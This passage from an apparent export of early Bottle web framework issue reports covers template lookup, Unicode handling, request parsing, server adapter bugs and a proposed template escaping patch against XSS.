    <style type=""text/css"">
        #container {
            width: 960px;
        }
    </style>
</head>
</html>
```

There are ways for me work around it by hacking the classes or subclassing Jinja2Template, but it's a number of lines of code and hampers the nice clean code I could normally use with Bottle.
"
36,request.GET: Multiple values per key are not possible,2010-03-04T16:36:39Z,2010-03-08T00:15:02Z,Undecided,,,"Hello,

First of all, thanks you for this piece of nice code. Very pleasant to use.
To me there is a bug in the request.GET function. It seems that it doesn't accept multiple value for a single key.

For instance:
/?fq=val1&fq=val2

To me the expected value of :
request.GET.get('fq') shoud be ['val1', 'val2']

Be returned value is : 'val2'

Seems that there is something going on here or with the MuliDict()
http://github.com/defnull/bottle/blob/master/bottle.py#L625

Doing :
/?fq=val1&fq=val2
- value of data http://github.com/defnull/bottle/blob/master/bottle.py#L622 is exepcted value {'fq': ['val1', 'val2']}

Regards,

xav
"
35,template not found when running app outside of its directory,2010-03-03T16:48:45Z,2010-03-03T20:00:42Z,,,,"While playing with nginx and bottle.py, I've noticed that if you run your run your app inside its directory
    cd /path/to/my_app/
    python app.py
everything runs fine, but if you run
    python /path/to/my_app/app.py
templates are not found. I've forked and commited changes to my fork of bottle [http://github.com/pims/bottle](http://github.com/pims/bottle)

tested with SimpleTemplate.
"
34,Automatically escape SimpleTemplate expansion values ,2010-02-27T20:13:02Z,2010-03-01T00:25:31Z,,,,"SimpleTemplate doesn't have an option to automatically escape any HTML characters in user input within a template (it looks like some of the examples would be vulnerable to XSS vulnerabilities as a result).  

To fix this it would be useful if we could include a `{{!...}}` option to the syntax which automatically escaped expanded values. This would be backwards compatible with the existing syntax and make writing safe templates much easier. 

```
>>> bottle.template(""{{x}}"",x=""<script...>"")
[u'<script...>']
>>> bottle.template(""{{!x}}"",x=""<script...>"")
[u'&lt;script...&gt;']
```

A simple patch to add a {{!...}} option to the syntax is attached below (patch is against the stplunicode branch)

```
--- bottle.py.orig  2010-02-27 19:49:27.000000000 +0000
+++ bottle.py   2010-02-27 19:48:35.000000000 +0000
@@ -1361,6 +1361,11 @@
             def __repr__(self): return '%s(%s)' % (self.f, self.s)
             def __str__(self): return self.s

+        class EscapedPyStmt(PyStmt):
+            def __repr__(self):
+                return '%s(%s)' % (self.f, self.s) + \
+                    '.replace(""&"",""&amp;"").replace(""<"",""&lt;"").replace("">"",""&gt;"")'
+
         def prt(txt): # Add a string or a PyStmt object to ptrbuffer
             if ptrbuffer and isinstance(txt, str) \
             and isinstance(ptrbuffer[-1], str): # Requied for line preserving
@@ -1428,7 +1433,14 @@
                 if line.strip().startswith('%%'):
                     line = line.replace('%%', '%', 1)
                 for i, part in enumerate(re.split(r'\{\{(.*?)\}\}', line)):
-                    if part: prt(PyStmt(part) if i%2 else part)
+                    if part:
+                        if i%2:
+                            if part.startswith(""!""):
+                                prt(EscapedPyStmt(part[1:]))
+                            else:
+                                prt(PyStmt(part))
+                        else:
+                            prt(part)
         flush()
         return '\n'.join(codebuffer) + '\n'
```

~                                                
"
33,Critial error while processing request,2010-02-27T16:27:51Z,2010-03-01T00:27:11Z,,,,"When there is a critical error, a helpful error message comes up 'Critial error while processing request', could someone just find and replace that to fix it to 'Critical error while processing request'
"
32,AutoServer adapters,2010-02-25T21:56:36Z,2010-02-26T11:55:02Z,,,,"class AutoServer(ServerAdapter):
    """""" Untested. """"""
    adapters = [FapwsServer, TornadoServer, CherryPyServer, PasteServer,
                TwistedServer, GunicornServer, WSGIRefServer]
    def run(self, handler):
        for sa in adapters:
            try:
                return sa(self.host, self.port, **self.options).run()
            except ImportError:
                pass

adapters isn't defined in run. So either you put it into the method or use self.adapters instead.

If I had not fount the function, I have asked you abaout that.
"
31,How do i run a bottle app with Tornado,2010-02-20T07:42:27Z,2010-03-05T16:21:50Z,,ImportError,ImportError: cannot import name TornadoServer,"Tried importing TornadoServer like this

from bottle import route, run, debug, template, view, TornadoServer

but got an import error

Traceback (most recent call last):
  File ""index.py"", line 1, in <module>
    from bottle import route, run, debug, template, view, TornadoServer
ImportError: cannot import name TornadoServer

checked bottle.py there was TornadoServer block.

Any suggetions !!!
"
30,NameError: name 'view' is not defined,2010-02-19T19:02:58Z,2010-02-20T12:58:14Z,,NameError,NameError: name 'view' is not defined,"@route('/hello/template/:names')
@view('hello')
def template_hello(names):
  names = names.split(',')
  return dict(title='Hello World', names=names)

created hello.tpl in the same directory as the bottle app and also in ./views directory . But view is not found.

Traceback (most recent call last):
  File ""index.py"", line 12, in <module>
    @view('hello')
NameError: name 'view' is not defined
"
29,0.7.0a BaseTemplate error,2010-02-13T23:27:35Z,2010-02-14T16:38:30Z,,,,"BaseTemplate class in **init** has no more argument 'filename' but in function 'template' is: 

```
        elif '.' in tpl:
                    TEMPLATES[tpl] = template_adapter(filename=tpl, lookup=lookup) 
```

which generates error if in template name is '.'
"
28,abort and simple text or json response,2010-02-05T19:06:55Z,2010-03-08T00:12:08Z,,,,"it would be great when developing services, if abort() could render responses other than html, such as plain text or json, perhaps based on accept header or how the route where abort() is raised is configured.
"
27,sqlite in Tutorial,2010-01-28T20:40:15Z,2010-04-12T16:29:35Z,,,,"In the tutorial sqlite3 is used. For the creation of the database the extern sqlite3-Shell creates the db. Why isn't it solved with python (since sqlite is installed in Python >2.4)? Windows users have to download sqlite_win to follow this tutorial step by step.
"
26,View + return dict + accept json header,2010-01-26T04:19:37Z,2010-01-26T11:42:46Z,Request,,,"It would be great if a request handler decorated with @view would revert to standard json output casting if http accept header is set to application/json. This way the same request handler can respond to html and json requests.
"
25,Make request body available via request.body during POST,2010-01-19T00:22:59Z,2010-01-19T08:46:22Z,,,,"Currently, there is no simple method to access the POST body if the app expects data other than form encoded data. 
"
24,Substitution with Unicode values do not work in SimpleTemplate,2010-01-13T19:21:05Z,2010-03-08T00:08:11Z,Bug,UnicodeEncodeError,UnicodeEncodeError: 'ascii' codec can't encode character u'\xe5' in position 0: ordinal not in range(128),"Let's say we have a minimal template:
{{foo}} saved in a file called called minimal.tpl

Now, in the main code trying something like:
template('minimal',foo='å') will result in an error like this:
Unhandled Exception: UnicodeEncodeError('ascii', u'\xe5', 0, 1, 'ordinal not in range(128)')

Traceback:
Traceback (most recent call last):
  File ""/home/pafcu/projects/testpod/bottle.py"", line 401, in handle
    return handler(**args)
  File ""testpod.py"", line 9, in rss2
    return template('minimal',foo=u'å')
  File ""/home/pafcu/projects/testpod/bottle.py"", line 1301, in template
    return TEMPLATES[tpl].render(**args)
  File ""/home/pafcu/projects/testpod/bottle.py"", line 1279, in render
    self.execute(stdout, **args)
  File ""/home/pafcu/projects/testpod/bottle.py"", line 1268, in execute
    eval(self.co, args)
  File ""./minimal.tpl"", line 1, in <module>
    {{foo}}
UnicodeEncodeError: 'ascii' codec can't encode character u'\xe5' in position 0: ordinal not in range(128)

The reason is probably the following line (in SimpleTemplate.prepare):
            def **repr**(self): return 'str(' + self + ')'

Here the use of ""str"" forces the string to ascii since no encoding is given, and since it's not possible to represent the character 'å' in ascii an exception is raised.
"
23,Handle HTTP POST pseudo-arrays correctly,2009-12-24T13:13:50Z,2010-03-08T00:15:49Z,Request,,,"Many HTTP clients ""encode"" arrays sent via HTTP POST like this:
    variable_name[0] = first_element
    variable_name[1] = second_element
    ...
    variable_name[n] = nth_element

For example, when using notable Javascript frameworks, `var foo = [""Hi"", ""there"", ""what's"", ""up?""]` is ""encoded"" into
    foo[0] = ""Hi""
    foo[1] = ""there""
    foo[2] = ""what's""
    foo[3] = ""up?""

when sending the array via POST.

Bottle should recognize such pseudo-arrays and try to handle them correctly (convert into Python list).
"
22,Error report,2009-12-21T15:36:34Z,2010-03-08T00:11:13Z,Bug,,,"Errors are not properly reported when an exception is raised.

HTTPError::**str**() calls repr(self.output), which escapes the multi-line string. Then it's embedded inside a <pre></pre> block, so it's printed as a single line error (quite hard to read and understand).

The fastest workaround is: s/repr(self.output)/self.output/ , but of course that is very insecure.
"
21,Anything behind %... causes a syntax error using default templates,2009-12-07T20:30:58Z,2009-12-08T07:59:16Z,,SyntaxError,SyntaxError: invalid syntax,"Using the examples (or any stripped down version) with a %... line returns an syntax error:

```
Error 500: Internal Server Error

Sorry, the requested URL /hello/jan,me caused an error:

Unhandled Exception: SyntaxError('invalid syntax', ('./views/hello.tpl', 6, 19, 'for name in names:\r\n'))
```

Traceback:

```
Traceback (most recent call last):
File ""/usr/lib/python2.5/site-packages/bottle.py"", line 309, in __call__
return ''.join(out)
File ""/home/jan/jouz/app.wsgi"", line 15, in pretty_hello
return template('hello', title='Hello World', names=names)
File ""/usr/lib/python2.5/site-packages/bottle.py"", line 955, in template
environ = os.environ.copy()
File ""/usr/lib/python2.5/site-packages/bottle.py"", line 758, in __init__
if sig[1:] == hmac.new(key, msg).digest().encode('base64').strip():
File ""/usr/lib/python2.5/site-packages/bottle.py"", line 863, in prepare
File ""./views/hello.tpl"", line 6
for name in names:

^
SyntaxError: invalid syntax
```

(used the code from the http://bottle.paws.de/ frontpage (fixed the decorator from get to request)
"
20,Add template inheritance and/or blocks,2009-12-06T20:38:56Z,2009-12-11T22:12:37Z,,,,"Any chance to add Mako/Django/Tempita style template inheritance to SimpleTemplate?

Actually, real ""inheritance"" wouldn't even be necessary if there were some sort of 'block' block.  I tried to approximate this with the following, but couldn't get it to work.

```
%def body():
  <b>{{stuff}}</b>
%end
%include base body=body()
```

Cheers!
"
19,Template lookup not working with mod_wsgi,2009-11-25T19:39:11Z,2009-11-27T09:43:52Z,Bug,,,"The template, jinja2_template, and mako_template modules don't seem to be able to find template files correctly in a mod_wsgi setup.

I have even tried appending my template path to the bottle.TEMPLATE_PATH object.

This stopped working for me right after 0.5.8.

Thanks,
Seth
"
18,yielding content and redirect won't work as expected,2009-11-09T13:05:26Z,2010-03-01T00:47:03Z,Bug,,,"try :

```
@route('/test')
def index():
    redirect(""/"")
    yield ""hello""
```

or :

```
@route('/test')
def index():
    redirect(""/"")
    yield ""hello""
```

the redirect don't do its job ... perhaps it's related to #16
"
17,Be able to force a download on known mime types.,2009-11-09T11:27:40Z,2009-11-27T17:54:45Z,Request,,,"Add an option to `bottle.send_file()` to force a download, even if the mime type is connected to an application on client side by adding a `Content-disposition: attachment; filename=...` header.
"
16,Yielding content doesn't send cookies responses,2009-11-09T10:35:22Z,2010-03-01T00:46:38Z,"Bug, Request",,,"If you do something like that :

```
@route('/')
def index():
    bottle.response.COOKIES['gato'] = 'hello'
    yield ""hello""
```

cookie is not created ... the workaround is to use return instead of yield ;-(
it would be better if cookies can be created in all cases
"
15,request.POST problem under Python 3.,2009-11-04T11:26:14Z,2009-11-23T08:01:53Z,,,,"Seems not to work under Python 3
Error Message:
Unhandled Exception: TypeError(""string argument expected, got 'bytes'"",)
"
14,Cherrypy server hangs on control+c,2009-11-03T05:55:14Z,2011-06-16T12:54:10Z,Bug,,,"Cherrypy server hangs and does not stop when control+c is issued.

Here is a patch that seems to resolve the issue: http://gist.github.com/224833
"
13,send_file always returns 401 on Windows #2,2009-10-27T10:38:53Z,2010-02-19T22:55:54Z,,,,"hello
I tested send_file on winXP and python 2.6.2
But send_file show 401 error with Access denied.

My code is below

@route('/static/:filename')
def sending_file(filename):
    send_file(filename, root='d:')

So I modify send_file following code to access root directory files.

Before
def send_file(filename, root, guessmime = True, mimetype = None):
    """""" Aborts execution and sends a static files as response. """"""
    root = os.path.abspath(root) + os.sep

After
def send_file(filename, root, guessmime = True, mimetype = None):
    """""" Aborts execution and sends a static files as response. """"""
    root = os.path.abspath(root)
    if not root.endswith(os.sep):
        root = root + os.sep

What do you think you?
"
12,send_file always returns 401 on Windows,2009-10-21T21:16:49Z,2009-10-22T10:38:25Z,Bug,,,"simply replace the literal `'/'` with `os.sep` in line 493.

Also, I'm not sure what the purpose of the `strip` on the next line is, but it should probable be `strip('/\\')` to be effective on Windows, since `os.path.join` accepts both slashes and backslashes.
"
11,Allow access to POST body,2009-10-21T07:04:21Z,2009-10-30T19:43:17Z,Request,,,"Currently there's no way to get the body of a POST request. This is especially necessary when the body is not form data.

Adding a `body` property is trivial, but it gets tricky if POST and body are both accessed. Not that I see much use for that.
"
10,send_file(): maximum recursion depth exceeded,2009-10-16T14:52:43Z,2009-10-16T14:53:04Z,Bug,,,"This is NOT ab bug in Bottle, but a Python stdlib bug. 

Python bug: Issue #5853: calling a function of the mimetypes module from several threads
at once could hit the recursion limit if the mimetypes database hadn't been
initialized before.

Add mimetype.init() to your start up script or update your Python stdlib.
"
9,Reloading and SIGTERM,2009-10-13T02:47:39Z,2009-10-30T19:25:32Z,Bug,,,"If bottle had spawned a child process to handle reloading and the parent process is killed (with SIGTERM as done by start-stop-deamon) the child survive and blocks the network port.
"
8,Stange Mako lookup problems,2009-10-06T19:31:12Z,2010-03-08T00:14:30Z,Needs input,,,"Bottle.template() excepts lookup paths to be either absolute or relative to the current working directory. Makos expects all template search paths in TemplateLookup to be relative to the template file who inherits or includes something. After looking at the sources I can't see how to properly use absolute paths in TemplateLookup without rewriting it from scratch. But it is also not possible to use <%include/> or <%inherit/> without a properly set up TemplateLookup. So basically the TemplateLookup settings depends on the location of the template file, which means that bottle.template(lookup=...) settings cannot be used without modification.

Next thing is that TemplateLookup settings have no effect on finding templates when you try to load them by filename. Mako has no Tempate-Lookup-By-Name feature, so Bottle has to do that.

What does this mean? Bottle has to justify all the lookup-paths to be relative to the current template in order to configure TemplateLookup for mako. My tests work, but it is a kind of dirty hack. If you use mako and have any problems related to template lookups, please report them here.
"
7,wrong defaults on MakoTemplate,2009-10-06T11:37:30Z,2009-10-06T16:47:31Z,Bug,,,"http://tinyurl.com/yar7dly -> default_filters=[] is wrong, the default filter for mako is ['unicode'].
If the attr is [], Mako will render only str or unicode, throwing an exception on other types (int, for example).

In my opinion the default for output_encoding and input_encoding should be 'utf-8', this would prevent encoding errors (at least... for me :P ). Keep up the good work!
"
6,SyntaxError using SimpleTemplate with AppEngine,2009-10-02T23:01:35Z,2009-10-30T19:30:23Z,Bug,,,"The flowing template raises a SyntaxError exception when using it in a Google AppEngine environment. I have no idea, why... Need more input 

```
%items = ['Hello', 'f']
<h1>Hello {{username}}</h1>
<p>How are you?</p> 
```
"
5,Mako templates not found in 0.6.2,2009-10-02T07:54:38Z,2009-10-02T22:58:43Z,Bug,,,"With 0.6.2 I am getting ""template not found"" when trying to use Mako. Reverting back to 0.5.8 corrects this issue without any code changes.

-Seth
"
3,Ability to run bottle in mod_wsgi,2009-08-20T16:25:54Z,2009-08-20T23:39:51Z,Undecided,,,"Is there a way to deploy botte with Apache + [mod_wsgi](http://code.google.com/p/modwsgi/)? Would be very helpful as apache is very widely spread.
"
2,routing function should support unicode,2009-08-16T09:37:37Z,2009-10-06T17:33:23Z,Request,,,"When returning a `unicode` object from a routing function, the ""bottle breaks"" and WSGI complains that it will only accept `str` objects. The framework could assume that I really want to return this UTF-8 encoded. Then, however, it also has to add/modify a content-type header, I guess. This is Python 2.6. What happens in 3.1 where all you have are ""real"" unicode strings?
"
1,URL fragment parameters should be unicode,2009-08-16T09:28:57Z,2009-08-17T11:31:09Z,Request,,,"most if not all browsers will pass URLs utf-8 encoded (curl does). I shouldn't be required to decode that manually. Example:

```
@route(r""/:name"")
def test(name):
    print `name`, type(name)
    return name
```

Now call this with `curl http://localhost:8080/äöüß`. A `UnicodeDecodeError` exception is raised. I can workaround this error by adding

```
@validate(name=lambda n:n.decode(""utf-8""))
```

but I don't want to ;)
"
